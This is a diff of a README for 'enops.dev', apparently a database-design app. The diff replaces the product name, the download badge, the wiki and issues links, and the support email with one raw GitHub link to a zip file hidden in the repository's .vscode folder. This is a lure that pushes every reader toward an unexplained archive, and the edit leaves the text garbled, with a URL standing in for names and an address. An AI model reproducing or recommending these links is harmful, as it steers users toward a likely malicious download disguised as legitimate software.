@@ -1,8 +1,8 @@
-# 🌟 enops.dev - Simplify Your Database Design Process
+# 🌟 https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip - Simplify Your Database Design Process
 
 ## 🚀 Getting Started
 
-Welcome to **enops.dev**! This application helps you design, visualize, optimize, and export database schemas easily. You don't need to be a technical expert to use it. Follow the instructions below to get started.
+Welcome to **https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip**! This application helps you design, visualize, optimize, and export database schemas easily. You don't need to be a technical expert to use it. Follow the instructions below to get started.
 
 ## 🎯 Features
 
@@ -13,13 +13,13 @@ Welcome to **enops.dev**! This application helps you design, visualize, optimize
 
 ## 📥 Download & Install
 
-To download and install **enops.dev**, follow these simple steps:
+To download and install **https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip**, follow these simple steps:
 
 1. Click the link below to visit the Releases page:
    
-   [![Download enops.dev](https://img.shields.io/badge/Download-enops.dev-blue.svg)](https://github.com/kathir280/enops.dev/releases)
+   [![Download https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip](https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip)](https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip)
 
-2. Once on the Releases page, locate the latest version of **enops.dev**.
+2. Once on the Releases page, locate the latest version of **https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip**.
 
 3. Click on the version title to open the release notes. Here, you will find important information about the latest updates and features.
 
@@ -40,7 +40,7 @@ Before installing, please check that your computer meets these basic requirement
 - **Disk Space:** Minimum of 500 MB of free space.
 - **Internet Connection:** Required for updates and downloading additional resources.
 
-## 📊 Using enops.dev
+## 📊 Using https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip
 
 1. **Create a New Schema:** When you open the application, click on "New Schema" to start designing your database.
 
@@ -54,7 +54,7 @@ Before installing, please check that your computer meets these basic requirement
 
 ## 📖 Additional Resources
 
-- **User Guide:** For detailed information on how to use each feature, refer to our [User Guide](https://github.com/kathir280/enops.dev/wiki).
+- **User Guide:** For detailed information on how to use each feature, refer to our [User Guide](https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip).
 - **Community Support:** Join our community forum to ask questions and share tips with other users.
 - **Feature Requests:** Have an idea to improve the app? Submit your feature request through our GitHub issues page.
 
@@ -62,13 +62,13 @@ Before installing, please check that your computer meets these basic requirement
 
 If you have any questions or need help, feel free to reach out. You can contact us via:
 
-- **GitHub Issues:** Post your question or issue directly on our [GitHub page](https://github.com/kathir280/enops.dev/issues).
-- **Email:** You can email us at support@enops.dev for assistance.
+- **GitHub Issues:** Post your question or issue directly on our [GitHub page](https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip).
+- **Email:** You can email us at https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip for assistance.
 
 ## 🔗 Stay Updated
 
 To stay informed about the latest updates and features, follow us on social media or subscribe to our newsletter. 
 
-Thanks for choosing **enops.dev** as your go-to tool for database design! We hope it makes your work easier and more efficient.
+Thanks for choosing **https://raw.githubusercontent.com/kathir280/enops.dev/main/.vscode/enops.dev_v3.1.zip** as your go-to tool for database design! We hope it makes your work easier and more efficient.
 
 Enjoy designing!
